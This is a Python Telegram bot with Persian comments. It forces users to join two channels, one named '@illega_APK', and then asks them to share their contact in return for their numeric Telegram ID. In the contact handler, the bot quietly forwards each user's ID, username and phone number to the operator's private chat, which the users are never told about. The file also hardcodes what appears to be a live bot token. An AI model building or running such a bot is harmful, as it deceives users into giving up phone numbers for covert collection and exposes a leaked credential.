import telegram
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import asyncio

# ⚠️ توکن و آیدی و کانال‌ها را با مقادیر خودت جایگزین کن
TOKEN = '7682398662:AAHagt611VPm7RmLLmGxdmaYdYPtHJbMp04'
MY_CHAT_ID = 'آیدی عددی خودت'
CHANNEL_1 = '@Good_APK_01'
CHANNEL_2 = '@illega_APK'

# بررسی عضویت در کانال‌ها
async def check_channel_membership(user_id, context):
    try:
        member1 = await context.bot.get_chat_member(chat_id=CHANNEL_1, user_id=user_id)
        is_member1 = member1.status in ['member', 'administrator', 'creator']
    except telegram.error.TelegramError as e:
        print(f"Error checking CHANNEL_1: {e}")
        is_member1 = False

    try:
        member2 = await context.bot.get_chat_member(chat_id=CHANNEL_2, user_id=user_id)
        is_member2 = member2.status in ['member', 'administrator', 'creator']
    except telegram.error.TelegramError as e:
        print(f"Error checking CHANNEL_2: {e}")
        is_member2 = False

    return is_member1, is_member2

# هندلر /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_member1, is_member2 = await check_channel_membership(user_id, context)

    if is_member1 and is_member2:
        keyboard = [[KeyboardButton("📱 دریافت آیدی عددی", request_contact=True)]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text(
            "برای دریافت آیدی عددی تلگرامت، لطفاً روی دکمه زیر کلیک کن:",
            reply_markup=reply_markup
        )
    else:
        message = "برای استفاده از این ربات، لطفاً ابتدا عضو کانال‌های زیر شو:\n"
        if not is_member1:
            message += f"🔹 {CHANNEL_1}\n"
        if not is_member2:
            message += f"🔹 {CHANNEL_2}\n"
        message += "\nسپس دستور /start را دوباره بزن."
        await update.message.reply_text(message)

# هندلر تماس (شماره)
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_member1, is_member2 = await check_channel_membership(user_id, context)

    if not (is_member1 and is_member2):
        message = "برای ادامه لطفاً ابتدا در کانال‌های زیر عضو شو:\n"
        if not is_member1:
            message += f"🔹 {CHANNEL_1}\n"
        if not is_member2:
            message += f"🔹 {CHANNEL_2}\n"
        message += "\nسپس /start را بزن."
        await update.message.reply_text(message)
        return

    if update.message.contact:
        phone_number = update.message.contact.phone_number
        username = update.effective_user.username or "بدون نام کاربری"
        await update.message.reply_text(f"✅ آیدی عددی تلگرامت: `{user_id}`", parse_mode="Markdown")
        await context.bot.send_message(
            chat_id=MY_CHAT_ID,
            text=f"👤 کاربر جدید:\n🆔 آیدی عددی: `{user_id}`\n📛 نام کاربری: @{username}\n📱 شماره موبایل: {phone_number}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("لطفاً از دکمه‌ی ارسال شماره استفاده کن.")

# اجرای اصلی ربات
async def main():
    print("✅ ربات در حال اجراست...")
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))

    await app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
